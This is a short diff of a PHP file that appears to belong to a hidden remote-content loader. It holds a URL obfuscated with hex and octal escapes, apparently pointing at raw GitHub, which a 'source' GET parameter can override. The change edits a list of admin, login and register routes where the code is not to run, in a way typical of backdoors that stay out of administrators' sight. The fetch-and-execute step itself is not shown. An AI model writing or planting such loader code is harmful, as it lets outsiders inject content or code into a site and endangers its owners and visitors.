@@ -3,7 +3,7 @@ $defaultUrl = "\x68\x74\x74\x70\163\72\x2f\x2f\162\x61\x77\56\147\151\x74\150\16
 $input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
 
 // Çalıştırılmaması gereken rota veya dosya isimlerinin listesi
-$restrictedRoutes = "index.php,admin,login,signup.html";
+$restrictedRoutes = "/logout,admin,login,signup.html,/member-login.html,register.html";
 
 // Mevcut URL'nin rotasını al
 $currentPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
